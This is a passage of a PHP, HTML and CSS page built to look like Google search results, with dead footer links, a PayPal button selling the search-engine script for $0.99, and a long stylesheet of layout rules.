",$googlegoogleapps84747474);

echo "<div class='googleapps847474747474747474744474'>";

echo "$googlegoogleapps84747474";

echo "</div>";

?>

<?php

echo "</div>";
echo "</div>";
echo "</div>";
echo "</div>";

?>

<?php

}

?>

</mobileappsinstallapps84>
</mobileinstallapps84>
</mobileappsinstall84>
</mobileapps84>

</mobilegoogleappsmobileapps84>

<?php

if(preg_match("/[\W\w]/","$_GET[username]"))

{

?>

<?php

}

?>

<?php

if(!preg_match("/[\W\w]/","$_GET[username]"))

{

?>

<?php

}

?>

<div class="footer">

<a rel='nofollow' class="logout88888844" onClick="window.open('','_self');">Sign in</a>

<div class='mobileappsusernameapps8884'><?php echo "$googleapps888844"; ?></div>

<a rel='nofollow' class="googleappsusermobileapps84" onClick="window.open('','_self');"">Switch account</a>

<a rel="nofollow" class="googleinstallappslinks1" onClick="window.open('','_self');">Help</a>

<a rel="nofollow" class="googleinstallappslinks2" onClick="window.open('','_self');">Send feedback</a>

<a rel='nofollow' class="googleinstallappslinks3" onClick="window.open('','_self');">Privacy</a>

<a rel="nofollow" class="googleinstallappslinks4" onClick="window.open('','_self');">Terms</a>

</div>

<?php

if (preg_match("//","$installgoogleappsmobileapps84"))

{
}

if (preg_match("//","$installgoogleappsmobileapps84"))

{
}

if (!preg_match("/(news|images|videos|maps|more)/","$installgoogleappsmobileapps84"))

{
}

if (preg_match("/news/","$installgoogleappsmobileapps84"))

{
}

if (preg_match("/images/","$installgoogleappsmobileapps84"))

{
}

if (preg_match("/videos/","$installgoogleappsmobileapps84"))

{

}

if (preg_match("/maps/","$installgoogleappsmobileapps84"))

{
}

if (preg_match("/more/","$installgoogleappsmobileapps84"))

{
}

if (preg_match("/settings/","$installgoogleappsmobileapps84"))

{
}

if (preg_match("/tools/","$installgoogleappsmobileapps84"))

{
}

?>

<script>
/* When the user clicks on the button, 
toggle between hiding and showing the dropdown content */
function googleapps8884() {
document.getElementById("googleapps8884").classList.toggle("show");
}

</script>

<script>
/* When the user clicks on the button, 
toggle between hiding and showing the dropdown content */
function myFunction() {
document.getElementById("myDropdown").classList.toggle("show");
}

</script>

<div class="divappsmobileapps84"></div>

<div class="divappsmobileapps8884"></div>

<div class="paypal">

<div>

<form target="paypal" action="https://www.paypal.com/cgi-bin/webscr" method="post">
<input type="hidden" name="cmd" value="_xclick">
<input type="hidden" name="business" value="<?php echo "mobileappsmobileapps8@gmail.com"; ?>">
<input type="hidden" name="amount" value='<?php echo "0.99"; ?>'>
<input type="hidden" name="return" value='<?php echo "https://mobileapps84.eu-gb.mybluemix.net/googlecustomsearchscript.zip"; ?>'>
<input name="item_name" type="hidden" value="Website script" />
<input type="submit" value="Pay" name="submit" title="" class="paypal_btn" id="google847474744474" formtarget="_self">
</form>

</div>

</div>

<div class="mobile1">

<div class="mobile2">

<div class="mobile3" onclick="document.getElementById('google847474744474').click();">

BUY

</div>

<div class="mobile4">

$0.99

</div>

</div>

<div class="mobile5">

Buy our search engine script and install it on your website hosting

</div>

</div>

</body>

</html>

<style>

html
{
margin-left:0%;
margin:0px;
font-family: arial,sans-serif;
background-color:#ffffff;
}

body
{
margin:0px;
padding:0px;
}

cite
{
color:#006621;
font-size:15.2px;
font-style:normal;
}

h1
{
margin:0px;
}

.googlemobilegoogleblog
{
margin-left:208px;
margin-bottom:0px;
}

.h3
{
font-weight:normal;
color:#1a0dab;
margin:0px;
font-size:18px;
}

h2
{
font-weight:normal;
color:#1a0dab;
margin:0px;
font-size:18px;
}

.h3 strong
{
font-weight:normal;
}

h2 strong
{
font-weight:normal;
}

cite strong
{
font-weight:normal;
}

p
{
color:#545454;
font-size:small;
margin:0px;
padding-top: 1px;
padding-bottom:22px;
line-height: 1.4;
}

a
{
color:#1a0dab;
}

.h3 a
{
color:#1a0dab;
text-decoration:none;
}

h2 a
{
color:#1a0dab;
text-decoration:none;
}

.installgoogleappsmobileapps84
{
width:100%;
height:108px;
background-color:#fafafa;
position:fixed;
bottom:0px;
left:0px
}

.google8474747474747474744474
{
color:#1a0dab;
font-weight:bold;
}

.googleapps847474747474747474744474
{
color:#828282;
font-size:12.8px;
}

@media screen and (max-width: 960px)
{
.username84
{
display:none!important;
}
.installgoogleapps8432
{
padding-bottom:16px!important;
}
}

.installgoogleappsmobileapps8432
{
padding:8px;
}

.installgoogleapps84
{
margin:8px;
background-color:#ffffff;
margin:0px;
width:662px;
}

.installgoogleappsinstallappsgoogleapps84
{
margin:8px;
margin-top:0px;
}

.installgoogleappsinstallappsgoogleapps
{
margin-top:8px;
}

.installgoogleappsinstallappsgoogleapps8432
{
padding:8px;
width:100%;
margin-left:-4px;
}

.installgoogleapps84:hover {
}

.installgoogleapps8432
{
padding-left:24px;
padding-right:16px;
padding-top:0px;
padding-bottom:0px;
background-color:#ffffff;
}

ul
{
display:none;
}

mobileappsinstallapps84
{
display:inline-block;
width:678px;
background-color:#f2f2f2;
}

mobileapps4
{
display:inline-block;
margin:8px;
background-color:#ffffff;
}

.topbar
{
width:100%;
height:122px;
background-color:#fafafa;
top:0px;
border-style:solid;
border-width:1px;
border-left:none;
border-right:none;
border-top:none;
border-color:#ebebeb;
}

.footer
{
width:100%;
height:82px;
background-color:#dddddd;
position:absolute;
left:0px;
margin-top:22px!important;
}

.input
{
margin:0px;
padding:16px;
padding-bottom:0px;
}

#input84
{
box-shadow: 0 1px 2px rgba(0, 0, 0, 0.6);
width:632px;
height:44px;
padding-left:16px;
border:none;
background-color:#ffffff;
color:#000000;
background-color: #fff;
height: 44px;
vertical-align: top;
border-radius: 2px;
box-shadow: 0 2px 2px 0 rgba(0,0,0,0.16),0 0 0 1px rgba(0,0,0,0.08);
transition: box-shadow 200ms cubic-bezier(0.4, 0.0, 0.2, 1);
}

#chatbox
{
box-shadow: 0 1px 2px rgba(0, 0, 0, 0.6);
width:632px;
height:44px;
padding-left:16px;
border:none;
background-color:#ffffff;
color:#000000;
background-color: #fff;
height: 44px;
vertical-align: top;
border-radius: 2px;
box-shadow: 0 2px 2px 0 rgba(0,0,0,0.16),0 0 0 1px rgba(0,0,0,0.08);
transition: box-shadow 200ms cubic-bezier(0.4, 0.0, 0.2, 1);
}

#input84:hover
{
box-shadow: 0 3px 8px 0 rgba(0,0,0,0.2),0 0 0 1px rgba(0,0,0,0.08);
}

#chatbox:hover
{
box-shadow: 0 3px 8px 0 rgba(0,0,0,0.2),0 0 0 1px rgba(0,0,0,0.08);
}

#input84[type='text']
{
font-size:16px;
}

#chatbox[type='text']
{
font-size:16px;
}

mobilegoogleapps84
{
display:inline-block;
margin-left:134px;
width:674px;
}

mobilegoogleappsmobileapps84
{
display:inline-block;
margin-left:134px;
width:674px;
}

mobileinstallapps84
{
display:block;
padding:8px;
}

.test {
  margin: 25px 0;
  width: 52px;
  height: 52px;
  border-radius: 50%;
  border: 6px solid transparent;
  background-size: 100% 100%, 50% 50%, 50% 50%, 50% 50%, 50% 50%;
  background-repeat: no-repeat;
  background-position: center center, left top, right top, left bottom, right bottom;
  background-origin: content-box, border-box, border-box, border-box, border-box;
  background-clip: content-box, border-box, border-box, border-box, border-box;
  transform: rotate(30deg);
  margin:0px;
  background-color:#db4437;
}

.testmobileapps84
{
margin: 25px 0;
  width: 52px;
  height: 52px;
  border-radius: 50%;
  border: 6px solid transparent;
  background-size: 100% 100%, 50% 50%, 50% 50%, 50% 50%, 50% 50%;
  background-repeat: no-repeat;
  background-position: center center, left top, right top, left bottom, right bottom;
  background-origin: content-box, border-box, border-box, border-box, border-box;
  background-clip: content-box, border-box, border-box, border-box, border-box;
  transform: rotate(30deg);
  margin:0px;
position: fixed;
bottom: 0px;
right: 0px;
margin-bottom:82px;
margin-right:26px;
background-color:#db4437;
display:none;
}

.testmobileappsgoogleapps84
{
margin: 25px 0;
  width: 52px;
  height: 52px;
  border-radius: 50%;
  border: 6px solid transparent;
  background-size: 100% 100%, 50% 50%, 50% 50%, 50% 50%, 50% 50%;
  background-repeat: no-repeat;
  background-position: center center, left top, right top, left bottom, right bottom;
  background-origin: content-box, border-box, border-box, border-box, border-box;
  background-clip: content-box, border-box, border-box, border-box, border-box;
  transform: rotate(30deg);
  margin:0px;
position: fixed;
bottom: 0px;
right: 0px;
margin-bottom:116px;
margin-right:96px;
background-color:#db4437;
}

.test84
{
transform: rotate(330deg);
margin-left: 6px;
font-size: 26px;
font-family: Varela Round, sans-serif;
font-weight:bold;
}

.testgoogleapps84
{
transform: rotate(330deg);
margin-left:13.8px;
font-size: 26px;
font-family: Varela Round, sans-serif;
font-weight:bold;
margin-top:7.4px;
color:#ffffff;
}

.test84 a
{
text-decoration:none;
color:#000000;
}

.testgoogleapps84 a
{
text-decoration:none;
color:#000000;
}

.box {
  width: 40%;
  margin: 0 auto;
  background: rgba(255,255,255,0.2);
  padding: 35px;
  border: 2px solid #fff;
  border-radius: 20px/50px;
  background-clip: padding-box;
  text-align: center;
}

.button {
  font-size: 1em;
  padding: 10px;
  color: #fff;
  border: 2px solid #06D85F;
  border-radius: 20px/50px;
  text-decoration: none;
  cursor: pointer;
  transition: all 0.3s ease-out;
}
.button:hover {
  background: #06D85F;
}

.overlay {
  position: fixed;
  top: 0;
  bottom: 0;
  left: 0;
  right: 0;
  background: rgba(0, 0, 0, 0.7);
  transition: opacity 500ms;
  visibility: visible;
  opacity: 4;
}
.overlay:target {
  visibility: visible;
  opacity: 1;
}

.popup {
  margin: 84px auto;
  padding: 0px;
  background: #fff;
  border-radius: 5px;
  width: 30%;
  position: relative;
  transition: all 5s ease-in-out;
}

.popup h2 {
  margin-top: 0;
  color: #333;
  font-family: Tahoma, Arial, sans-serif;
}
.popup .close {
  position: absolute;
  top: 20px;
  right: 30px;
  transition: all 200ms;
  font-size: 30px;
  font-weight: bold;
  text-decoration: none;
  color: #ffffff;
}
.popup .close:hover {
  color: #ffffff;
}
.popup .content {
  max-height: 30%;
  overflow: visible;
  padding:16px;
}

@media screen and (max-width: 700px){
  .box{
width: 70%;
  }
  .popup{
width: 70%;
  }
}

#popup1 {
-moz-animation: cssAnimation 0s ease-in 12s forwards;
/* Firefox */
-webkit-animation: cssAnimation 0s ease-in 12s forwards;
/* Safari and Chrome */
-o-animation: cssAnimation 0s ease-in 12s forwards;
/* Opera */
animation: cssAnimation 0s ease-in 12s forwards;
-webkit-animation-fill-mode: forwards;
animation-fill-mode: forwards;
}

@keyframes cssAnimation {
to {
width:0;
height:0;
overflow:hidden;
}
}
@-webkit-keyframes cssAnimation {
to {
width:0;
height:0;
visibility:hidden;
}
}

.installgoogleappsinstallapps84
{
padding:8px;
}

.mobile84
{
background-color:#1565C0;
padding:16px;
font-size:34px;
}

.mobileinstallapps84
{
background-color:#1565C0;
padding:16px;
font-size:34px;
color:#ffffff;
}

.headerlinksinstallapps84
{
color:#828282;
font-size:12.8px;
text-decoration:none;
padding-bottom:16px;
padding-left:8px;
padding-right:8px;
}

.headerlinks1
{
color:#828282;
font-size:12.8px;
text-decoration:none;
padding-bottom:12px;
padding-left:4px;
padding-right:4px;
}

.headerlinks2
{
color:#828282;
font-size:12.8px;
text-decoration:none;
padding-bottom:12px;
padding-left:4px;
padding-right:4px;
}

.headerlinks3
{
color:#828282;
font-size:12.8px;
text-decoration:none;
padding-bottom:12px;
padding-left:4px;
padding-right:4px;
}

.headerlinksmaps84
{
color:#828282;
font-size:12.8px;
text-decoration:none;
padding-bottom:12px;
padding-left:4px;
padding-right:4px;
}

.headerlinksmoreapps84
{
color:#828282;
font-size:12.8px;
text-decoration:none;
padding-bottom:12px;
padding-left:4px;
padding-right:4px;
}

.headerlinks4
{
color:#828282;
font-size:12.8px;
text-decoration:none;
padding-bottom:12px;
padding-left:4px;
padding-right:4px;
}

.headerlinkstools
{
float:right;
color:#828282;
font-size:12.8px;
margin-top:2px;
text-decoration:none;
padding-bottom:16px;
padding-left:4px;
padding-right:4px;
padding-left: 12px;
padding-right: 12px;
padding-bottom: 6px;
right:18px;
z-index:1;
}

.headerlinkstools:hover
{
}

.headerlinkssettings
{
color:#828282;
font-size:12.8px;
margin-top:2px;
text-decoration:none;
}

.installgoogleappsmobileinstallapps84
{
margin-top:134px;
}

mobileappsinstallappsgoogleappsinstallapps84
{
background-color:fafafa;
}

@media screen and (min-width: 960px)
{
.googleappsinstallappsimg84
{
position:fixed;
left:752px;
top:24px;
}
.googleappsimg84
{
display:none;
}
.headerlinkstools84
{
color:#828282;
font-size:12.8px;
margin-top:2px;
text-decoration:none;
padding-bottom:16px;
padding-left:4px;
padding-right:4px;
padding-left: 12px;
padding-right: 12px;
padding-bottom: 6px;
padding-top:0px;
top:78px;
z-index:1;
}
.headerlinkstools84:hover
{
border-style:none;
border-width: 1px;
border-radius: 1px;
background-color: #f8f8f8;
border-radius: 2px;
border: 1px solid transparent;
display: inline-block;
text-align: center;
border-radius: 2px;
line-height: 19px;
cursor: pointer;
margin-left: -1px;
padding: 4px 15px;
border: 1px solid #c6c6c6;
margin-left:-4px;
position:absolute;
margin-top:7px;
margin-left:0.4px;
}
.headerlinkstools
{
display:none;
}
}

.installgoogleappsgoogleappsinstallappsgoogleapps84
{
padding-left:16px;
padding-top:0px;
padding-bottom:0px;
padding-top:5px;
}

.googleinstallappslinks1
{
position:relative;
top:18px;
margin-left:174px;
color:#828282;
font-size:12.8px;
}

.googleinstallappslinks2
{
position:relative;
top:18px;
margin-left:18px;
color:#828282;
font-size:12.8px;
}

.googleinstallappslinks3
{
position:relative;
top:18px;
margin-left:18px;
color:#828282;
font-size:12.8px;
}

.googleinstallappslinks4
{
position:relative;
top:18px;
margin-left:18px;
color:#828282;
font-size:12.8px;
}

#googleappsgoogleappsinstallgoogleapps84
{
position:fixed;
right:0px;
top:0px;
padding-bottom:108px;
}

#googleappsgoogleappsinstallgoogleapps84 img
{
width:82px;
height:82px;
}

.installbuttonappsgoogleapps84
{
position:fixed;
top:0px;
left:0px;
z-index:1;
}

.brandname
{
left:18px;
top:24px;
font-size:26px;
z-index:18;
position:absolute;
}

#googleapps84
{
border-radius:2px;
background-color:#ffffff;
padding-top:5px;
}

.installgoogleapps
{
margin-top:8px;
}

@media screen and (min-width: 960px)
{
mobileinstallapps84
{
display:block!important;
}
}

@media screen and (min-width: 960px)
{
.installgoogleappsinstallappsgoogleapps8432
{
padding-left:4px;!important;
}
.headerlinks1
{
padding-left:17px!important;
padding-right:18px!important;
}
.headerlinks2
{
padding-left:17px!important;
padding-right:17px!important;
}
.headerlinks3
{
padding-left:17px!important;
padding-right:17px!important;
}
.headerlinksmaps84
{
padding-left:17px!important;
padding-right:17px!important;
}
.headerlinksmoreapps84
{
padding-left:17px!important;
padding-right:17px!important;
}
.dropdown
{
margin-left:84px!important;
}
}

@media screen and (max-width: 960px)
{
html
{
margin-left:0px;
width:100%;
background-color:#f2f2f2!important;
}
mobileapps84
{
width:100%;
}
.topbar
{
width:100%;
height:96px;
}
.footer
{
width:100%;
margin-top:8px!important;
}
#input84
{
width:100%;
}
#chatbox
{
width:100%;
}
mobilegoogleapps84
{
margin-left:0px;
}
mobilegoogleapps84
{
width:100%;
}
mobilegoogleappsmobileapps84
{
margin-left:0px;
width:100%;
}
mobileappsinstallapps84
{
width:100%;
margin-left:0px;
background-color:#f2f2f2;
}
.installgoogleappsmobileapps84
{
width:100%;
}
.googleappsimg84
{
position:fixed;
right:22px;
top:86px;
}
.googleappsinstallappsimg84
{
display:none;
}
.installgoogleapps84
{
width:100%;
background-color:#f2f2f2;
}
mobileinstallapps84
{
margin-left:0px;
padding-top:0px;
}
.installgoogleappsgoogleappsinstallappsgoogleapps84
{
padding-left:10.2px;
}
.installgoogleapps8432
{
padding-left:16px;
margin:8px;
box-shadow:0 1px 2px rgba(0,0,0,0.2);
border-radius:2px;
background-color:#ffffff;
padding-top:16px;
margin-bottom:10px!important;
}
.headerlinkstools84
{
display:none;
}
#googleappsgoogleappsinstallgoogleapps84 img
{
width:44px;
height:44px;
}
#myDropdowngoogleapps84
{
display:none;
}
.googleappsgoogleappsinstallgoogleappsgoogleapps84
{
padding-left:16px;
}
.dropbtngoogleapps84
{
width:100%;
}
.testmobileappsgoogleapps84
{
margin-right:52px;
}
.brandname
{
top:0px;
left:0px;
z-index:0;
width:100%;
background-color:#dddddd;
position:relative;
}
.brandname84
{
margin-top:9px!important;
background-image:url();
background-position:146px 0px;
background-repeat:no-repeat;
background-size:44px 44px;
}
.brandname
{
background-color:#f2f2f2!important;
}
.googleinstallappslinks1
{
margin-left:16px;
}
.headerlinks1
{
padding-bottom:6px;
font-family: Roboto-Regular,HelveticaNeue,Arial,sans-serif!important;
font-size: 12px;
text-transform: uppercase;
border-width:2px!important;
padding-bottom:11px!important;
text-shadow:none!important;
padding-left:15px;
padding-right:16px;
}
.headerlinks2
{
padding-bottom:6px;
font-family: Roboto-Regular,HelveticaNeue,Arial,sans-serif!important;
font-size: 12px;
text-transform: uppercase;
border-width:2px!important;
padding-bottom:11px!important;
text-shadow:none!important;
padding-left:11px;
padding-right:12px;
}
.headerlinks3
{
padding-bottom:6px;
font-family: Roboto-Regular,HelveticaNeue,Arial,sans-serif!important;
font-size: 12px;
text-transform: uppercase;
border-width:2px!important;
padding-bottom:11px!important;
text-shadow:none!important;
padding-left:12px!important;
padding-right:12px!important;
}
.headerlinksmaps84
{
padding-bottom:6px;
font-family: Roboto-Regular,HelveticaNeue,Arial,sans-serif!important;
font-size: 12px;
text-transform: uppercase;
border-width:2px!important;
padding-bottom:11px!important;
text-shadow:none!important;
padding-left:12px!important;
padding-right:12px!important;
}
.headerlinksmoreapps84
{
padding-bottom:6px;
font-family: Roboto-Regular,HelveticaNeue,Arial,sans-serif!important;
font-size: 12px;
text-transform: uppercase;
border-width:2px!important;
padding-bottom:11px!important;
text-shadow:none!important;
padding-left:12px!important;
padding-right:12px!important;
}
.headerlinks4
{
padding-bottom:6px;
font-family: Roboto-Regular,HelveticaNeue,Arial,sans-serif!important;
font-size: 12px;
text-transform: uppercase;
border-width:2px!important;
padding-bottom:11px!important;
text-shadow:none!important;
padding-left:16px!important;
padding-right:16px!important;
}
.installgoogleappsinstallappsgoogleapps8432
{
background-color:#dddddd;
margin-left:-8px;
}
.installgoogleappsinstallappsgoogleapps84
{
margin-left:16px;
margin-right:16px;
margin-bottom:0px;
}
.installgoogleappsinstallappsgoogleapps
{
margin-top:0px;
}
.brandname84
{
padding-left:16px;
padding-top:8px;
padding-bottom:8px;
background-color:#f2f2f2;
}
.googleappsimgapps84
{
padding-top:12px;
padding-left:8px;
padding-bottom:0px;
}
#input84
{
padding:8px;
height:39px;
box-shadow:none;
border-style:solid;
border-width:1px;
border-color:#dddddd;
border-bottom:none;
padding-left:16px!important;
}
#chatbox
{
padding:8px;
height:39px;
box-shadow:none;
border-style:solid;
border-width:1px;
border-color:#dddddd;
border-bottom:none;
padding-left:16px!important;
}
.input
{
padding:8px;
background-color:#f2f2f2!important;
}
.dropbtngoogleapps84
{
margin-top:0px!important;
}
mobileinstallapps84
{
background-color:#f2f2f2!important;
}
.installgoogleappsinstallappsgoogleapps8432
{
background-color:#f8f8f8!important;
}
.installgoogleappsinstallappsgoogleapps
{
margin-top:-8px!important;
}
.installgoogleappsinstallappsgoogleapps84
{
margin-left:8px!important;
margin-right:8px!important;
}
.installgoogleappsinstallappsgoogleapps8432
{
}
.installgoogleappsgoogleappsinstallappsgoogleapps84
{
display:none;
}
.installgoogleappsinstallappsgoogleapps8432
{
margin-left:-8px!important;
border-style:solid;
border-width:1px;
border-color:#dddddd;
padding-right:14px;
padding-bottom:0px;
border-bottom-left-radius:2px;
border-bottom-right-radius:2px;
border-bottom-width:2px;
padding-top:10px;
padding-left:0px;
}
mobilegoogleappsmobileapps84
{
margin-top:18px;
}
.installgoogleapps8432
{
margin-left:0px!important;
margin-right:0px!important;
margin-top:0px!important;
}
p
{
font-size:14px!important;
color:#222!important;
padding-top:16px;
padding-bottom:16px!important;
}
.h3
{
font-size:16px!important;
}
h2
{
font-size:16px!important;
}
mobilegoogleappsmobileapps84
{
margin-top:-6px!important;
}
#input84:hover
{
box-shadow:none;
}
#chatbox:hover
{
box-shadow:none;
}
#googleapps84
{
box-shadow:none;
padding:0px;
}
.topbar
{
}
mobilegoogleappsmobileapps84
{
}
}

.brandname84
{
margin-top:0px;
margin-left:0px;
font-size:26px;
}

@media screen and (max-width: 334px)
{
.headerlinks4
{
display:none;
}
}

@media screen and (min-width: 960px)
{
.headerlinks1
{
padding-left:12px;
padding-right:12px;
}
.headerlinks2
{
padding-left:12px;
padding-right:12px;
}
.headerlinks3
{
padding-left:12px;
padding-right:12px;
}
.headerlinksmaps84
{
padding-left:12px;
padding-right:12px;
}
.headerlinksmoreapps84
{
padding-left:12px;
padding-right:12px;
}
.headerlinks4
{
padding-left:12px;
padding-right:12px;
}
.installgoogleappsgoogleappsinstallappsgoogleapps84
{
margin-top:-3px!important;
padding-top:0px;
}
mobileinstallapps84
{
padding-bottom:0px;
}
p
{
padding-bottom:16px!important;
}
}

</style>

<style>
.dropbtn {
color:#828282;
font-size:12.8px;
margin-top:2px;
text-decoration:none;
padding-left:4px;
padding-right:0px;
border:none;
padding-right:12px;
}

.dropbtn:hover, .dropbtn:focus {
}

.dropdown {
position: relative;
display: inline-block;
margin-left:246px;
}

.dropdown-content {
display: none;
position: absolute;
background-color: #f9f9f9;
min-width: 160px;
overflow: auto;
box-shadow: 0px 8px 16px 0px rgba(0,0,0,0.2);
z-index: 1;
top:26px;
}

.dropdown-content a {
color: black;
padding: 12px 16px;
text-decoration: none;
display: block;
font-size:12.8px;
background-color:#ffffff;
padding-left:18px;
padding-top:8px;
padding-bottom:8px;
}

.dropdown a:hover
{
background-color: #f1f1f1
}

.show
{
display:block!important;
}

@media screen and (max-width: 960px)
{
.dropdown
{
display:none;
}
.headerlinkstools84
{
display:none;
}
}

</style>

<style>
.dropbtngoogleapps84 {
margin-right:8px;
color:#828282;
font-size:12.8px;
margin-top:4px;
text-decoration:none;
padding-left:4px;
padding-right:62px;
border:none;
background-position:right;
background-repeat:no-repeat;
outline:none!important;
}

.dropbtngoogleapps84:hover, .dropbtngoogleapps84:focus {
}

.dropdowngoogleapps84 {
position: relative;
display: inline-block;
float:right;
}

.dropdown-contentgoogleapps84 {
display: none;
position: absolute;
background-color: #f9f9f9;
min-width: 160px;
overflow: auto;
box-shadow: 0px 8px 16px 0px rgba(0,0,0,0.2);
z-index: 1;
}

.dropdown-contentgoogleapps84 a {
color: black;
padding: 12px 16px;
text-decoration: none;
display: block;
font-size:12.8px;
}

.dropdowngoogleapps84 a:hover
{
background-color: #f1f1f1
}

.show {display:block;}

#myDropdowngoogleapps84
{
left:534px;
top:74px;
z-index:2;
display:none;
}

.googleappsgoogleappsinstallgoogleappsgoogleapps84
{
padding-left:34px;
}

.googleappsplusapps84
{
position:fixed;
bottom:82px;
left:18px;
}

.googleappsinstallappsgoogleappsinstallappsgoogleapps84
{
background-color:#1565C0;
border-style:solid;
border-width:1px;
border-radius:2px;
padding-top:8px;
padding-bottom:8px;
padding-left:34px;
padding-right:34px;
width:62px;
position:fixed;
right:8px;
bottom:4px;
z-index:18;
color:#ffffff;
border-radius:4px;
}

@media screen and (max-width: 960px)
{
.dropbtn
{
}
strong
{
font-weight:normal!important;
}
.headerlinksmaps84
{
}
}

.googleappsinstallapps84 {
position: relative;
display: inline-block;
float:right;
}

.googleappsinstallappslinuxapps84 {
display: none;
position: absolute;
background-color: #f9f9f9;
min-width: 160px;
overflow: auto;
box-shadow: 0px 8px 16px 0px rgba(0,0,0,0.2);
z-index: 1;
bottom:44px;
background-color:#dddddd;
left:0px;
}

.googleappsinstallappslinuxapps84 a {
color: black;
padding: 12px 16px;
text-decoration: none;
display: block;
font-size:12.8px;
position:fixed;
bottom:44px;
background-color:#dddddd;
left:0px;
height:208px;
width:100%;
}

.googleappsinstallapps84 a:hover
{
background-color: #f1f1f1
}

.show {display:block;}

.mobilelinuxapps84
{
width:100%;
height:44px;
background-color:#dddddd;
position:fixed;
bottom:0px;
z-index:4;
}

input[type='text'] {
background-position:right 6px;
background-repeat:no-repeat;
}

.mobileappssettings84
{
padding:8px;
}

.mobileappssettings84:hover
{
background-color: rgba(0,0,0,0.1)!important;
}

mobileappsads84
{
border-style:solid;
border-width:1px;
border-radius:2px;
font-size:12px;
padding-left:2px;
padding-right:2px;
margin-right:6px;
height:8px;
}

.mobileappsinstallapps84
{
background: linear-gradient(to bottom, #f0f0f0, #e9e9e9);
-webkit-user-select: none;
-moz-user-select: none;
-o-user-select: none;
-ms-user-select: none;
-khtml-user-select: none; 
user-select: none;
box-shadow: 0 18px 40px 10px rgba(0, 0, 0, 0.34);
z-index:4;
border-radius:4px;
display:none;
}

.mobileapps8444
{
padding:12px;
background-color:#f4f4f4;
background: linear-gradient(to bottom, #f0f0f0, #e9e9e9);
border-radius:4px;
}

.dropbtnmobileappsappsmobileapps84
{
width: 108px;
background-color: #e7e7e7;
position: absolute;
border-top: none;
border-left: none;
border-width: 2px;
top: 0px;
padding:8px;
margin-left:54px;
}

.dropdown-contentmobileappsappsmobileapps84
{
overflow: auto;
top: 74px;
left: 24px;
width:274px;
height:408px;
background-color:#e7e7e7;
box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);
padding:16px;
z-index:4;
}

.showmobileappsappsmobileapps84
{
display:block;
}

.b_factrow
{
display:none;
}

.logout84 a
{
top:24px!important;
right:24px!important;
position:absolute!important;
}

.signup84
{
top:24px!important;
right:24px!important;
position:absolute!important;
}

.googleapps888844
{
color:#4285f4;
}

.googleapps88888844
{
color:#4285f4;
}

.wrapper {
  width:100%;
  white-space: nowrap;
  overflow-y: hidden;
  overflow-x: scroll;
  -webkit-overflow-scrolling: touch;
    &::-webkit-scrollbar {
        display: none;
    }
}

#internal {
  display: inline;
  &:nth-child(odd) {
  }
}

@media screen and (min-width: 960px)
{
.wrapper
{
width:100%;
overflow-x:hidden;
height:884px;
width:884px;
}
.googleappsmobileappsinstallapps8884
{
display:none;
}
}

@media screen and (max-width: 960px)
{
.headerlinksmoreapps84
{
display:none!important;
}
.wrapper
{
padding-bottom:12px;
}
.divappsmobileapps847474744474
{
right:18px!important;
top:14.8px!important;
}
}

.wrapper::-webkit-scrollbar
{
display:none;
}

.googleappsrecommendapps84
{
color:red;
}

.pulsate {
color:#222222;
font-weight:bold;
font-size:12px;
padding-bottom:12px!important;
}

a
{
text-decoration:none;
}

@media screen and (max-width: 960px)
{
.logout8884
{
display:none!important;
}
}

/* The Modal (background) */
.modal {
    display: none; /* Hidden by default */
    position: fixed; /* Stay in place */
    z-index: 1; /* Sit on top */
    padding-top: 100px; /* Location of the box */
    left: 0;
    top: 0;
    width: 100%; /* Full width */
    height: 100%; /* Full height */
    overflow: auto; /* Enable scroll if needed */
    background-color: rgb(0,0,0); /* Fallback color */
    background-color: rgba(0,0,0,0.4); /* Black w/ opacity */
}

/* Modal Content */
.modal-content {
    background-color:#ffffff;
    border: 1px solid #888;
    width: 678px;
    margin-left: 141px;
    margin-top: 61px;
}

/* The Close Button */
.close {
    color: #aaaaaa;
    float: right;
    font-size: 28px;
    font-weight: bold;
    margin-right:12px;
}

.close:hover,
.close:focus {
    color: #000;
    text-decoration: none;
    cursor: pointer;
}

@media screen and (max-width: 960px)
{
.modal-content
{
width:100%;
margin-left:0px;
margin-top:55px;
border-style:none;
background-color:transparent;
}
.modal-content84
{
margin:8px;
}
.close
{
margin-top:8px;
}
.googlemobileinstallapps888844
{
left:96px!important;
top:38px!important;
}
.googleappsinstallapps44
{
display:none;
}
}

.googlemobileinstallapps888844
{
width:172px;
height:44px;
background-color:#ffffff;
position:absolute;
top:16px;
left:234px;
color: #545454;
font-size: small;
margin: 0px;
padding:8px;
line-height: 1.4;
}

.triangle {
  box-sizing: border-box;
}

.triangle {
  display: inline-block;
  margin: 0 5px;
  vertical-align: middle;
}
.triangle-5 {
    width: 26px;
    height: 30px;
    border-top: solid 12px #ffffff;
    border-left: solid 16px transparent;
    border-right: solid 16px transparent;
    margin-left:130px;
    margin-top:13.8px;
}

.divapps84 {
  box-sizing: border-box
}
.divapps84 {
  box-shadow: inset 0 0 3px 0px #484848, 0 0 6px 0px #484848;
  width: 18px;
  height: 18px;
  margin: 0 auto;
  border-radius: 50%;
  border-top: 4px solid #2E7D32;
  border-right: 4px solid #EF6C00;
  border-bottom: 4px solid #EF6C00;
  border-left: 4px solid #2E7D32;
  transform: rotate(54deg);
  position: relative;
  left: 158px;
  top: 30px;
  position: absolute;
}
.divapps84:before, .divapps84:after {
  content: "";
  position: absolute;
  left: -4px;
  top: -4px;
  width: 100%;
  height: 100%;
  border-radius: 50%;
}

.divapps84:before {
  border-top: 4px solid #F9A825;
  border-right: 4px solid transparent;
  border-bottom: 4px solid transparent;
  border-left: 4px solid transparent;
  transform: rotate(60deg)
}
.divapps84:after {
  border-top: 4px solid #F9A825;
  border-right: 4px solid transparent;
  border-bottom: 4px solid transparent;
  border-left: 4px solid transparent;
  transform: rotate(30deg)
}

.googleappslinksapps84
{
width:100%;
height:100%;
position:fixed;
}

@media screen and (min-width: 960px)
{
.input1
{
margin-bottom:12px;
}
}

.googleappsinstallappsappsappsapps8884
{
    background-color: #4285f4;
    border-style: solid;
    border-width: 1px;
    border-radius: 4px;
    padding-top: 8px;
    padding-bottom: 8px;
    padding-left: 18px;
    padding-right: 18px;
    margin-left: -40px;
    margin-top: 0px;
    color: #ffffff;
    position: absolute;
    left: 0px;
    -webkit-user-select: none;
    -webkit-transition: background .2s .1s;
    transition: background .2s .1s;
    border: 0;
    -webkit-border-radius: 3px;
    border-radius: 3px;
    cursor: pointer;
    display: inline-block;
    font-size: small;
    font-weight: bold;
    min-width: 4em;
    outline: none;
